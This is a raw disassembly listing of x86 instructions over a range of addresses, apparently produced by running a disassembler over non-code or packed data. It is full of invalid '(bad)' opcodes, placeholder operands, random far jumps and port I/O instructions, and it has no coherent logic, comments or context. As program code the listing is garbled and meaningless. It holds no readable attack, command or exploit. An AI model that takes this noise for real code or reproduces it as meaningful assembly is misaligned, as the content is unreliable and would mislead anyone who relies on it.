  42ad96:	adc    bl,BYTE PTR [esi+esi*8]
  42ad99:	hlt    
  42ad9a:	xor    bl,BYTE PTR [edi-0x293db617]
  42ada0:	ins    BYTE PTR es:[edi],dx
  42ada1:	cmp    BYTE PTR [ebx],0x6
  42ada4:	fwait
  42ada5:	inc    edi
  42ada6:	scas   eax,DWORD PTR es:[edi]
  42ada7:	daa    
  42ada8:	add    edi,DWORD PTR [esi+0x51]
  42adab:	pop    edi
  42adac:	add    BYTE PTR ds:0xfe28d4c2,al
  42adb2:	jbe    0x42ad3e
  42adb4:	lahf   
	...
  42ae15:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae1b:	mov    edi,0xe6d5f7ff
  42ae20:	and    ebp,DWORD PTR [edi+ebp*8-0x5f3d1d01]
  42ae27:	retf   0x1
  42ae2a:	pop    es
  42ae2b:	add    DWORD PTR [eax],eax
  42ae2d:	add    BYTE PTR [ecx-0x63],dh
  42ae30:	sbb    eax,0x2b2710f7
  42ae35:	(bad)  
  42ae36:	push   edx
  42ae37:	ins    BYTE PTR es:[edi],dx
  42ae38:	jne    0x42ae8a
  42ae3a:	cli    
  42ae3b:	scas   eax,DWORD PTR es:[edi]
  42ae3c:	lds    ebx,FWORD PTR [esi]
  42ae3e:	aaa    
  42ae3f:	xor    eax,ebx
  42ae41:	push   eax
  42ae42:	out    0x6e,al
  42ae44:	daa    
  42ae45:	jmp    0x42ae18
  42ae47:	popf   
  42ae48:	ins    DWORD PTR es:[edi],dx
  42ae49:	dec    esi
  42ae4a:	mov    dl,0x8c
  42ae4c:	rcl    ecx,0xff
  42ae4f:	inc    ebx
  42ae50:	ja     0x42ae2e
  42ae52:	or     al,0x2d
  42ae54:	rol    esp,cl
  42ae56:	arpl   si,cx
  42ae58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ae59:	fsubr  DWORD PTR [esi-0x13c35470]
  42ae5f:	xor    dl,BYTE PTR [ebx+0x4c]
  42ae62:	pop    edi
  42ae63:	call   0x346a3eb0
  42ae68:	lods   eax,DWORD PTR ds:[esi]
  42ae69:	xchg   ebp,eax
  42ae6a:	add    eax,0xea1f4289
  42ae6f:	sub    al,0x53
  42ae71:	jne    0x42ae62
  42ae73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ae75:	pop    esp
  42ae76:	das    
  42ae77:	bound  eax,QWORD PTR [edi-0x8]
  42ae7a:	cs adc al,0x6b
  42ae7d:	out    0x62,al
  42ae7f:	imul   edx,DWORD PTR [ecx+0x3b3b7944],0xb108b6c5
  42ae89:	mov    eax,ds:0x9cb9bf45
  42ae8e:	jl     0x42aee6
  42ae90:	add    BYTE PTR [eax-0x24c59a9d],bl
  42ae96:	adc    esi,esi
  42ae98:	xchg   edi,eax
  42ae99:	xor    BYTE PTR [edi-0x33f246dd],ah
  42ae9f:	jle    0x42ae50
  42aea1:	(bad)  
  42aea2:	jnp    0x42aecd
  42aea4:	pusha  
  42aea5:	cmp    DWORD PTR [ebp-0x5990c23b],esp
  42aeab:	lds    edi,FWORD PTR ds:[esi-0xba6fb4d]
  42aeb2:	push   es
  42aeb3:	mov    BYTE PTR [edi+0x6a],dl
  42aeb6:	push   eax
  42aeb7:	mov    edx,0x561f22a5
  42aebc:	mov    cl,0x8a
  42aebe:	jp     0x42ae94
  42aec0:	or     al,0x66
  42aec2:	leave  
  42aec3:	iret   
  42aec4:	jge    0x42aecc
  42aec6:	bound  esi,QWORD PTR [ebp+ecx*1-0x7f]
  42aeca:	jecxz  0x42ae68
  42aecc:	jbe    0x42aeb5
  42aece:	jg     0x42ae65
  42aed0:	adc    ebx,edi
  42aed2:	jbe    0x42ae94
  42aed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aed5:	jo     0x42aeea
  42aed7:	inc    esi
  42aed8:	or     al,BYTE PTR [ebx]
  42aeda:	mov    ds:0x8ded8097,eax
  42aedf:	push   0xffffffc7
  42aee1:	sbb    DWORD PTR [esi+edi*8],ebp
  42aee4:	mov    al,ds:0xcbc32932
  42aee9:	add    dl,dh
  42aeeb:	pop    ss
  42aeec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aeed:	dec    esi
  42aeee:	bound  edx,QWORD PTR [edi-0x53]
  42aef1:	jo     0x42aee7
  42aef3:	gs aaa 
  42aef5:	mov    BYTE PTR [edx-0x71040913],0x84
  42aefc:	mov    cl,al
  42aefe:	fnstcw WORD PTR [ecx]
  42af00:	jecxz  0x42af76
  42af02:	bnd jnp 0x42aea5
  42af05:	sub    eax,0xd3044a16
  42af0a:	push   ecx
  42af0b:	pop    edx
  42af0c:	leave  
  42af0d:	leave  
  42af0e:	ins    DWORD PTR es:[edi],dx
  42af0f:	inc    BYTE PTR [esi]
  42af11:	xlat   BYTE PTR ds:[ebx]
  42af12:	mov    bl,0x3b
  42af14:	mov    esp,0xc8da7197
  42af19:	arpl   WORD PTR [edi+0x2bbc418b],dx
  42af1f:	push   eax
  42af20:	les    ebp,FWORD PTR [esi-0x6e]
  42af23:	add    BYTE PTR [ebp+0x1e59d73e],0x81
  42af2a:	xchg   esp,eax
  42af2b:	mov    ds:0x279172ff,al
  42af30:	xchg   ecx,eax
  42af31:	cdq    
  42af32:	sbb    ebp,DWORD PTR [edx+0x7]
	...
  42af95:	add    cl,bh
  42af97:	enter  0xdc7a,0x7b
  42af9b:	(bad)  
  42af9c:	(bad)  
  42af9d:	in     eax,dx
  42af9e:	(bad)  
  42af9f:	adc    DWORD PTR [ebp+0x6be058ea],0x70
  42afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afa7:	retf   
  42afa8:	add    DWORD PTR [eax],eax
  42afaa:	pop    es
  42afab:	add    DWORD PTR [eax],eax
  42afad:	add    BYTE PTR [edx],cl
  42afaf:	lods   eax,DWORD PTR ds:[esi]
  42afb0:	(bad)  
  42afb1:	das    
  42afb2:	data16 and BYTE PTR [edi+0x39],ch
  42afb6:	pop    esi
  42afb7:	mov    al,0xa1
  42afb9:	sub    esp,esp
  42afbb:	dec    ebp
  42afbc:	(bad)  
  42afbd:	sbb    eax,0x62634c23
  42afc2:	out    dx,eax
  42afc3:	in     eax,0xd0
  42afc5:	jle    0x42afcc
  42afc7:	and    ebx,DWORD PTR [esi]
  42afc9:	or     DWORD PTR [ebx-0x5bdceb93],eax
  42afcf:	fisubr WORD PTR ds:0x1fe5e510
  42afd5:	ror    esp,cl
  42afd7:	mov    esp,0x3fae3e47
  42afdc:	mov    WORD PTR cs:[ecx+ebx*4],?
  42afe0:	inc    edx
  42afe1:	or     dh,BYTE PTR [esi+0x18]
  42afe4:	(bad)  
  42afe5:	mov    edi,0xc642d173
  42afea:	das    
  42afeb:	sbb    dl,BYTE PTR [ebx+0x6eec94d6]
  42aff1:	enter  0x19e7,0xa9
  42aff5:	adc    ebp,DWORD PTR [esi-0x3a434375]
  42affb:	enter  0x146e,0x0
  42afff:	in     al,dx
  42b000:	sbb    eax,DWORD PTR [ebx-0x49]
  42b003:	or     al,0x86
  42b005:	jnp    0x42af8b
  42b007:	shl    DWORD PTR [ebp+0xb],0xee
  42b00b:	js     0x42afa2
  42b00d:	mov    edi,0x372ddb57
  42b012:	add    BYTE PTR [ecx+0x79d1a929],bl
  42b018:	sbb    ebx,DWORD PTR [ebx+0x49]
  42b01b:	imul   esi,DWORD PTR [ebp-0x2c7abb83],0x763b5566
  42b025:	ja     0x42b00c
  42b027:	call   0x78ac:0x31e9e19b
  42b02e:	and    BYTE PTR [edi],ah
  42b030:	dec    ecx
  42b031:	in     eax,0x96
  42b033:	xchg   edi,eax
  42b034:	mov    al,0xb
  42b036:	fcomp  QWORD PTR [ebp+eiz*2+0x15]
  42b03a:	enter  0x24aa,0x78
  42b03e:	add    bl,BYTE PTR [ecx]
  42b040:	xor    cl,al
  42b042:	xchg   BYTE PTR [ecx+eiz*4+0x5b],al
  42b046:	mov    edx,0x8ebeab0f
  42b04b:	cld    
  42b04c:	mov    edi,0x73657531
  42b051:	cmc    
  42b052:	inc    esp
  42b053:	les    di,DWORD PTR [ebx]
  42b056:	xor    ch,BYTE PTR [ebx]
  42b058:	xor    ebp,esp
  42b05a:	inc    esp
  42b05b:	push   es
  42b05c:	inc    esp
  42b05d:	mov    al,0xc8
  42b05f:	pusha  
  42b060:	retf   0x55f
  42b063:	sbb    edi,DWORD PTR [esi]
  42b065:	ds mov edi,0x7e0ea5a9
  42b06b:	stc    
  42b06c:	(bad)  
  42b06d:	sahf   
  42b06e:	push   0x5d
  42b070:	dec    esi
  42b071:	and    ch,BYTE PTR [edx+0x4624e34a]
  42b077:	dec    ebx
  42b078:	xor    dl,0x2d
  42b07b:	lds    esp,FWORD PTR [edi+0x67e7dc32]
  42b081:	push   cs
  42b082:	(bad)  
  42b083:	xchg   edx,eax
  42b084:	ins    DWORD PTR es:[edi],dx
  42b085:	sbb    ch,ch
  42b087:	call   DWORD PTR [edx+0x16a142c9]
  42b08d:	ds dec eax
  42b08f:	popf   
  42b090:	shl    DWORD PTR [ecx+0x643d8dd7],cl
  42b096:	push   0x34
  42b098:	lods   al,BYTE PTR ds:[esi]
  42b099:	popa   
  42b09a:	add    al,0xb4
  42b09c:	loopne 0x42b046
  42b09e:	pop    ecx
  42b09f:	lds    ecx,FWORD PTR [ebx]
  42b0a1:	loope  0x42b0cd
  42b0a3:	jno    0x42b11c
  42b0a5:	pushf  
  42b0a6:	cld    
  42b0a7:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42b0a9:	and    DWORD PTR [eax+esi*1],eax
  42b0ac:	div    DWORD PTR [ebx-0x61583c48]
  42b0b2:	ffreep st(4)
  42b0b4:	mov    dl,0x0
	...
  42b116:	jne    0x42b13d
  42b118:	imul   ebx,DWORD PTR [edi-0x51]
  42b11c:	cmc    
  42b11d:	(bad)  
  42b11e:	dec    DWORD PTR [edi+0x1d0180ad]
  42b124:	cmp    eax,0x1ccae2b
  42b129:	add    BYTE PTR [edi],al
  42b12b:	add    DWORD PTR [eax],eax
  42b12d:	add    BYTE PTR [esi+edx*4-0x71],bl
  42b131:	dec    ebp
  42b132:	test   eax,0x9ad2fbba
  42b137:	jp     0x42b0d9
  42b139:	dec    esi
  42b13a:	aaa    
  42b13b:	xchg   ecx,eax
  42b13c:	adc    al,0x91
  42b13e:	mov    bh,0xb
  42b140:	inc    edi
  42b141:	xchg   ebx,eax
  42b142:	mov    ch,0x3a
  42b144:	dec    edx
  42b145:	xchg   esi,eax
  42b146:	je     0x42b116
  42b148:	fsub   DWORD PTR [eax+0x243a64cc]
  42b14e:	mov    ds:0xa650fe56,al
  42b153:	or     DWORD PTR [edi-0x5ad617c],esi
  42b159:	popa   
  42b15a:	mov    ebp,0xb7a46783
  42b15f:	mov    WORD PTR [ebx],fs
  42b161:	inc    ebp
  42b162:	adc    ch,ah
  42b164:	outs   dx,BYTE PTR ds:[esi]
  42b165:	dec    edi
  42b166:	fdivr  QWORD PTR [edx+0x33]
  42b169:	repnz cdq 
  42b16b:	add    eax,0x2e8cd2af
  42b170:	mov    dh,ah
  42b172:	or     BYTE PTR [edi+edx*4+0x29070e32],0x36
  42b17a:	mov    bl,0xe9
  42b17c:	adc    ecx,DWORD PTR [edi+eiz*2]
  42b17f:	mov    edx,0xafe1715f
  42b184:	stos   DWORD PTR es:[edi],eax
  42b185:	call   FWORD PTR [edx+0x16d9cdd0]
  42b18b:	div    DWORD PTR [ebx-0x74120dc]
  42b191:	aam    0x63
  42b193:	jmp    0xc85fac1f
  42b198:	jns    0x42b1af
  42b19a:	ficomp WORD PTR [edi-0xe]
  42b19d:	push   cs
  42b19e:	stos   BYTE PTR es:[edi],al
  42b19f:	rol    BYTE PTR [ebp+0x49564645],0xdb
  42b1a6:	jecxz  0x42b165
  42b1a8:	mov    WORD PTR [eax-0x24],fs
  42b1ab:	mov    bh,0x83
  42b1ad:	sbb    eax,0x1607b8ae
  42b1b2:	ins    BYTE PTR es:[edi],dx
  42b1b3:	stc    
  42b1b4:	sbb    DWORD PTR [esi+0x1124253c],edi
  42b1ba:	aas    
  42b1bb:	scas   al,BYTE PTR es:[edi]
  42b1bc:	dec    edi
  42b1bd:	loop   0x42b231
  42b1bf:	mov    al,ds:0x903a00f7
  42b1c4:	inc    eax
  42b1c5:	call   0xaa3f:0xf0129118
  42b1cc:	mov    eax,ds:0xe2519890
  42b1d1:	inc    ebx
  42b1d2:	fist   DWORD PTR [edi+0x36]
  42b1d5:	cmp    al,ch
  42b1d7:	ss je  0x42b160
  42b1da:	jbe    0x42b1b2
  42b1dc:	or     BYTE PTR [ecx-0x9],dh
  42b1df:	mov    ah,0x10
  42b1e1:	inc    edi
  42b1e2:	out    dx,al
  42b1e3:	pop    es
  42b1e4:	test   bh,al
  42b1e6:	(bad)  
  42b1e7:	xchg   edx,eax
  42b1e8:	hlt    
  42b1e9:	fwait
  42b1ea:	inc    ecx
  42b1eb:	mov    dl,0xa4
  42b1ed:	pop    ebp
  42b1ee:	addr16 (bad) 
  42b1f0:	adc    eax,0x5bab0441
  42b1f5:	scas   al,BYTE PTR es:[edi]
  42b1f6:	hlt    
  42b1f7:	ret    0xb45d
  42b1fa:	imul   edx,DWORD PTR [edx-0x5d],0x18
  42b1fe:	pop    ebx
  42b1ff:	call   DWORD PTR [edi]
  42b201:	test   DWORD PTR [ebp+0x4e],ebp
  42b204:	lds    esp,FWORD PTR [ecx+0x3a]
  42b207:	sbb    DWORD PTR [ecx],ecx
  42b209:	sbb    dl,ah
  42b20b:	or     esi,DWORD PTR [ebp-0x21377acc]
  42b211:	mov    eax,0xfc061350
  42b216:	pop    edi
  42b217:	mov    al,ds:0x99396865
  42b21c:	ja     0x42b255
  42b21e:	dec    ebp
  42b21f:	dec    ebp
  42b220:	xor    eax,0xb0f899b8
  42b225:	call   0x56679ed4
  42b22a:	aaa    
  42b22b:	mov    bl,0xb7
  42b22d:	mov    BYTE PTR [edi+0x2ed80115],al
  42b233:	dec    edx
  42b234:	push   eax
	...
  42b295:	add    BYTE PTR [ebp-0x449f6672],ah
  42b29b:	ja     0x42b29a
  42b29d:	iret   
  42b29e:	arpl   dx,si
  42b2a0:	or     BYTE PTR [ebp+0x55],ch
  42b2a3:	add    BYTE PTR [ebp-0x2d],dl
  42b2a6:	mov    ch,0xcd
  42b2a8:	add    DWORD PTR [eax],eax
  42b2aa:	pop    es
  42b2ab:	add    DWORD PTR [eax],eax
  42b2ad:	add    ch,dl
  42b2af:	pop    edi
  42b2b0:	addr16 daa 
  42b2b2:	pop    edi
  42b2b3:	ja     0x42b294
  42b2b5:	adc    BYTE PTR ds:0xb1664e86,bl
  42b2bb:	push   ebx
  42b2bc:	or     esi,DWORD PTR [edx-0x8a5f209]
  42b2c2:	ret    0x496c
  42b2c5:	xor    eax,DWORD PTR [ebx-0x7d]
  42b2c8:	mov    ah,0x4d
  42b2ca:	push   ebp
  42b2cb:	mov    dh,0x36
  42b2cd:	jmp    0xa010:0x7c652fb3
  42b2d4:	cmp    esp,ecx
  42b2d6:	or     ebp,edi
  42b2d8:	mov    esi,edi
  42b2da:	fstp   DWORD PTR [edx+0x7c]
  42b2dd:	cmp    eax,0x3883ddb8
  42b2e2:	push   eax
  42b2e3:	mov    edx,0x207ebd65
  42b2e8:	shr    BYTE PTR [edx+0x12dacfff],1
  42b2ee:	stos   DWORD PTR es:[edi],eax
  42b2ef:	sbb    eax,0x7d608a9
  42b2f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b2f5:	pop    edx
  42b2f6:	popa   
  42b2f7:	xchg   ecx,eax
  42b2f8:	sbb    BYTE PTR [edi],ah
  42b2fa:	pop    ecx
  42b2fb:	push   edx
  42b2fc:	cmp    ah,BYTE PTR ds:0xa1710a4c
  42b302:	xor    DWORD PTR fs:[eax],esi
  42b305:	sub    ch,BYTE PTR [ebx-0x691f82a9]
  42b30b:	add    al,BYTE PTR [edi+ebp*4+0x3a05f6ff]
  42b312:	imul   ebp,DWORD PTR ds:0xd8458bcf,0x58
  42b319:	xchg   DWORD PTR [esi+ebx*1+0x38],ebx
  42b31d:	adc    edi,ecx
  42b31f:	sub    al,0x97
  42b321:	popa   
  42b322:	jg     0x42b2e1
  42b324:	je     0x42b347
  42b326:	or     al,0x35
  42b328:	push   0x9
  42b32a:	pushf  
  42b32b:	lahf   
  42b32c:	add    eax,0x3c29ac6b
  42b331:	jle    0x42b3b1
  42b333:	lock loop 0x42b35f
  42b336:	fstp   TBYTE PTR [esi]
  42b338:	outs   dx,BYTE PTR ds:[esi]
  42b339:	jns    0x42b2ef
  42b33b:	bnd ja 0x42b2f2
  42b33e:	jo     0x42b2fb
  42b340:	sub    DWORD PTR [ebx-0x32e68ccb],eax
  42b346:	cdq    
  42b347:	or     al,0xb1
  42b349:	sti    
  42b34a:	sbb    BYTE PTR [edi+0x2a],ah
  42b34d:	out    0x8c,al
  42b34f:	out    dx,al
  42b350:	aad    0x10
  42b352:	push   edi
  42b353:	mov    bh,0xb6
  42b355:	lods   eax,DWORD PTR ds:[esi]
  42b356:	mov    al,0x21
  42b358:	div    DWORD PTR [edx+eiz*8-0x3273490d]
  42b35f:	sbb    al,0x45
  42b361:	adc    al,0x32
  42b363:	imul   esi,DWORD PTR [edi+0x7e6bdf6e],0xffffffc0
  42b36a:	xor    ch,BYTE PTR [ecx-0x7e]
  42b36d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b36e:	xchg   BYTE PTR ds:0xa8a8442d,bl
  42b374:	jl     0x42b2f8
  42b376:	mov    bh,0x3d
  42b378:	xor    edx,ebx
  42b37a:	dec    ebp
  42b37b:	ror    esi,0x26
  42b37e:	sti    
  42b37f:	(bad)  
  42b381:	sbb    ebp,edx
  42b383:	out    dx,al
  42b384:	test   BYTE PTR ds:0x35af81a4,cl
  42b38a:	mov    ds:0x13587f92,al
  42b38f:	loop   0x42b3ec
  42b391:	inc    edi
  42b392:	int3   
  42b393:	xor    DWORD PTR ds:0x1378c143,edx
  42b399:	pop    ecx
  42b39a:	sbb    bh,BYTE PTR [edi+0x7]
  42b39d:	and    edx,DWORD PTR ds:0x898558e3
  42b3a3:	sbb    al,0xc9
  42b3a5:	xchg   edi,eax
  42b3a6:	sbb    cl,bh
  42b3a8:	xchg   DWORD PTR [edx],ecx
  42b3aa:	jle    0x42b3a7
  42b3ac:	arpl   WORD PTR [ecx],si
  42b3ae:	adc    DWORD PTR [ecx+0x64],0x8a719423
	...
  42b415:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b41b:	out    dx,eax
  42b41c:	into   
  42b41d:	shl    BYTE PTR gs:[esp+esi*8+0x42],0xaf
  42b423:	js     0x42b3ef
  42b425:	dec    ecx
  42b426:	mov    esp,0x70001ce
  42b42b:	add    DWORD PTR [eax],eax
  42b42d:	add    cl,cl
  42b42f:	inc    ecx
  42b430:	dec    ecx
  42b431:	mov    al,0xf3
  42b433:	aad    0xe8
  42b435:	stos   BYTE PTR es:[edi],al
  42b436:	adc    BYTE PTR [ebx+edi*4-0x38],ah
  42b43a:	pushf  
  42b43b:	xchg   BYTE PTR [ecx],dh
  42b43d:	in     al,dx
  42b43e:	pusha  
  42b43f:	dec    edi
  42b440:	xchg   edi,eax
  42b441:	pop    eax
  42b442:	lock and esp,esp
  42b445:	fwait
  42b446:	sub    DWORD PTR [eax-0x7c],0xffffffbb
  42b44a:	cdq    
  42b44b:	sub    eax,0xdfb04f8f
  42b450:	cmp    eax,0x7ec390ef
  42b455:	or     ecx,DWORD PTR [ebx-0x7f]
  42b458:	loopne 0x42b4af
  42b45a:	mov    ebx,0x53d47e4b
  42b45f:	mov    ecx,0x28a36fda
  42b464:	pop    ebp
  42b465:	mov    ecx,?
  42b467:	imul   esp,DWORD PTR [esi-0x46],0x9449d920
  42b46e:	mov    al,0xf7
  42b470:	xchg   esi,eax
  42b471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b472:	push   ebx
  42b473:	js     0x42b402
  42b475:	push   edx
  42b476:	ins    BYTE PTR es:[edi],dx
  42b477:	hlt    
  42b478:	sub    DWORD PTR [edi+0x45],ecx
  42b47b:	ins    DWORD PTR es:[edi],dx
  42b47c:	add    bh,dl
  42b47e:	sub    al,0x2d
  42b480:	push   edi
  42b481:	lds    edi,FWORD PTR [eax-0x4e]
  42b484:	adc    al,0x36
  42b486:	sbb    ch,BYTE PTR [esi]
  42b488:	push   eax
  42b489:	pop    esi
  42b48a:	call   0x1069:0x39792c22
  42b491:	and    BYTE PTR [esi+0x4a5d54f1],ah
  42b497:	out    0x2f,al
  42b499:	fld    TBYTE PTR [edx-0x244219dd]
  42b49f:	test   al,0xa9
  42b4a1:	(bad)  
  42b4a2:	out    0xaa,eax
  42b4a4:	ror    cl,1
  42b4a6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42b4a8:	pop    edi
  42b4a9:	test   BYTE PTR [edx],bl
  42b4ab:	add    ah,bh
  42b4ad:	jmp    0x715b:0x73cb03e7
  42b4b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b4b5:	xchg   edx,eax
  42b4b6:	jle    0x42b49f
  42b4b8:	xchg   ecx,eax
  42b4b9:	pop    ss
  42b4ba:	sbb    ecx,DWORD PTR [ebx]
  42b4bc:	mov    al,0x7f
  42b4be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4bf:	dec    ebx
  42b4c0:	mov    ch,0x6a
  42b4c2:	mov    bl,0x8a
  42b4c4:	mov    dl,0x16
  42b4c6:	out    0x16,eax
  42b4c8:	add    al,0x11
  42b4ca:	push   eax
  42b4cb:	mov    ch,0xb4
  42b4cd:	es pop eax
  42b4cf:	pop    edi
  42b4d0:	jecxz  0x42b4ac
  42b4d2:	dec    eax
  42b4d3:	add    al,0x62
  42b4d5:	stc    
  42b4d6:	xchg   esi,eax
  42b4d7:	std    
  42b4d8:	mov    ch,0xd3
  42b4da:	aam    0x25
  42b4dc:	sub    dl,BYTE PTR [ebp-0x4b]
  42b4df:	mov    ds,ebx
  42b4e1:	cmp    cl,BYTE PTR [esi+0x2b]
  42b4e4:	imul   ecx
  42b4e6:	and    bl,0xa1
  42b4e9:	jae    0x42b47d
  42b4eb:	repnz push cs
  42b4ed:	xchg   ebp,eax
  42b4ee:	sbb    dx,WORD PTR [esi-0x5c]
  42b4f2:	rcl    DWORD PTR [esi],1
  42b4f4:	push   edi
  42b4f5:	xchg   edx,eax
  42b4f6:	in     al,dx
  42b4f7:	xor    al,BYTE PTR [edx+0x57]
  42b4fa:	mov    DWORD PTR [ebp-0x172b6433],esp
  42b500:	fdivp  st(2),st
  42b502:	mov    ?,WORD PTR [bx+si+0x16c]
  42b507:	xchg   edi,eax
  42b508:	add    bl,BYTE PTR [ecx+0x35]
  42b50b:	jle    0x42b57c
  42b50d:	sbb    DWORD PTR [ebp-0xc],esi
  42b510:	pushf  
  42b511:	or     al,0xcd
  42b513:	mov    esi,0x73c4cc9c
  42b518:	push   cs
  42b519:	push   0x5c
  42b51b:	jne    0x42b57f
  42b51d:	cwde   
  42b51e:	(bad)  [edx]
  42b520:	ja     0x42b4fe
  42b522:	pusha  
  42b523:	iret   
  42b524:	fs sahf 
  42b526:	sub    cl,BYTE PTR [ebp-0x55]
  42b529:	pushf  
  42b52a:	les    ebx,FWORD PTR [esp+ecx*8-0xfd83c3f]
  42b531:	stos   BYTE PTR es:[edi],al
  42b532:	int    0x58
  42b534:	stc    
	...
  42b595:	add    al,ah
  42b597:	xchg   esp,eax
  42b598:	and    bh,cl
  42b59a:	je     0x42b59b
  42b59c:	out    dx,eax
  42b59d:	mov    edi,0xcf8f6ca5
  42b5a2:	mov    cl,0xaf
  42b5a4:	ja     0x42b540
  42b5a6:	ret    
  42b5a7:	iret   
  42b5a8:	add    DWORD PTR [eax],eax
  42b5aa:	pop    es
  42b5ab:	add    DWORD PTR [eax],eax
  42b5ad:	add    BYTE PTR [ebp-0x6d2e862f],dl
  42b5b3:	adc    bl,BYTE PTR [edi-0x38]
  42b5b6:	dec    edx
  42b5b7:	pop    DWORD PTR [edx+0x73bec963]
  42b5bd:	jbe    0x42b577
  42b5bf:	mov    eax,ds:0xdbb1632d
  42b5c4:	fidiv  DWORD PTR [edx-0x77a8e10a]
  42b5ca:	mov    bh,BYTE PTR [edx+0x38648f8a]
  42b5d0:	test   DWORD PTR [edi],0x30379d04
  42b5d6:	jno    0x42b5b9
  42b5d8:	jge    0x42b644
  42b5da:	les    esi,FWORD PTR [ebx]
  42b5dc:	xor    eax,0xca374263
  42b5e1:	jae    0x42b57d
  42b5e3:	push   es
  42b5e4:	or     eax,0x999d1e29
  42b5e9:	(bad)  
  42b5ea:	shr    DWORD PTR [esi-0x3bb385eb],0xa2
  42b5f1:	xor    eax,0xbee50934
  42b5f6:	dec    ebx
  42b5f7:	xchg   esi,eax
  42b5f8:	call   0xa4bebdfa
  42b5fd:	jbe    0x42b5c0
  42b5ff:	or     eax,0x1bbfc1e
  42b604:	mov    ds,WORD PTR [ebp-0x3e]
  42b607:	add    BYTE PTR [ecx+eiz*2],dh
  42b60a:	add    esp,DWORD PTR [ebx]
  42b60c:	fst    QWORD PTR [edi+0x42]
  42b60f:	jl     0x42b624
  42b611:	ficomp DWORD PTR [ecx+0xe]
  42b614:	out    dx,al
  42b615:	pusha  
  42b616:	aam    0xb7
  42b618:	retf   0x68dc
  42b61b:	clc    
  42b61c:	cmc    
  42b61d:	add    eax,DWORD PTR [ebp+esi*2-0x9]
  42b621:	lea    eax,[ebx-0x80]
  42b624:	loope  0x42b654
  42b626:	mov    al,ds:0xc7b1848
  42b62b:	inc    esi
  42b62c:	sub    eax,0xaba00d94
  42b631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b632:	inc    edx
  42b633:	repz inc ebp
  42b635:	xchg   edx,eax
  42b636:	mov    ebx,ecx
  42b638:	mov    esi,0x164ded42
  42b63d:	xchg   esi,eax
  42b63e:	icebp  
  42b63f:	dec    edi
  42b640:	mov    edi,0x94cde2f2
  42b645:	xor    eax,0x706eebc1
  42b64a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b64b:	gs xchg ebx,eax
  42b64d:	mov    edx,0xa8863120
  42b652:	mov    eax,ds:0x7ca5de8b
  42b657:	pop    ebp
  42b658:	cli    
  42b659:	inc    ebx
  42b65a:	pop    WORD PTR [edi+edi*1]
  42b65e:	xchg   BYTE PTR ds:0xe660797,ah
  42b664:	enter  0x7e46,0xb
  42b668:	bnd jmp 0x6e8588a1
  42b66e:	in     eax,0xc2
  42b670:	sub    eax,0xc89158c1
  42b675:	ficomp DWORD PTR [esi+0x4d12d1f]
  42b67b:	xor    dh,BYTE PTR [ebx+esi*4+0x44]
  42b67f:	dec    eax
  42b680:	(bad)  
  42b681:	lock cli 
  42b683:	imul   ecx,DWORD PTR [ecx+ebp*4+0x46],0x66f13e5a
  42b68b:	mov    esi,0xeaf6b4a3
  42b690:	xor    BYTE PTR [esi+0x411b729e],ah
  42b696:	inc    ebx
  42b697:	or     dh,0xc2
  42b69a:	fild   DWORD PTR [ecx-0x37c5c7e9]
  42b6a0:	ror    ch,1
  42b6a2:	mov    ch,0x3d
  42b6a4:	lahf   
  42b6a5:	das    
  42b6a6:	js     0x42b698
  42b6a8:	push   edi
  42b6a9:	test   BYTE PTR [eax+0xe],dl
  42b6ac:	ret    
  42b6ad:	jno    0x42b703
  42b6af:	adc    BYTE PTR [ebx-0x65],ah
  42b6b2:	(bad)
	...
  42b715:	add    BYTE PTR [esi+0x42],cl
  42b718:	dec    ecx
  42b719:	daa    
  42b71a:	dec    ebp
  42b71b:	das    
  42b71c:	outs   dx,BYTE PTR ds:[esi]
  42b71d:	imul   eax,DWORD PTR [ebx],0xffffffcd
  42b720:	sub    BYTE PTR [ebp-0x1c],bl
  42b723:	into   
  42b724:	inc    edx
  42b725:	or     eax,0x1d0ca
  42b72a:	pop    es
  42b72b:	add    DWORD PTR [eax],eax
  42b72d:	add    bl,dh
  42b72f:	loope  0x42b70a
  42b731:	mov    bl,0x2b
  42b733:	mov    ?,ecx
  42b735:	js     0x42b76c
  42b737:	cdq    
  42b738:	pop    ebp
  42b739:	push   esi
  42b73a:	cmp    al,0xf2
  42b73c:	or     eax,0xf1787687
  42b741:	or     BYTE PTR [esi-0x22],bl
  42b744:	cmc    
  42b745:	sub    edx,DWORD PTR [ecx+0x4e]
  42b748:	push   ebx
  42b749:	cmp    DWORD PTR [ebx-0xd],edi
  42b74c:	push   cs
  42b74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b74e:	shr    BYTE PTR [edx-0x62],1
  42b751:	mov    ds:0x1eb868e2,eax
  42b756:	out    0xac,eax
  42b758:	(bad)  
  42b759:	lock mov bh,0xc6
  42b75c:	dec    ecx
  42b75d:	push   ebp
  42b75e:	daa    
  42b75f:	jb     0x42b6f3
  42b761:	pop    ds
  42b762:	cmp    eax,0x7a5fa79a
  42b767:	mov    edi,0xba16c648
  42b76c:	adc    al,0x4e
  42b76e:	cmp    al,0x4f
  42b770:	xchg   ebx,eax
  42b771:	jp     0x42b76b
  42b773:	mov    ebx,DWORD PTR [esp+edi*8]
  42b776:	lea    esp,[edx+0x63]
  42b779:	sahf   
  42b77a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b77b:	scas   eax,DWORD PTR es:[edi]
  42b77c:	jno    0x42b7cd
  42b77e:	outs   dx,DWORD PTR ds:[esi]
  42b77f:	jge    0x42b729
  42b781:	pop    ebp
  42b782:	sbb    eax,DWORD PTR [eax]
  42b784:	pop    esp
  42b785:	inc    bl
  42b787:	je     0x42b7ae
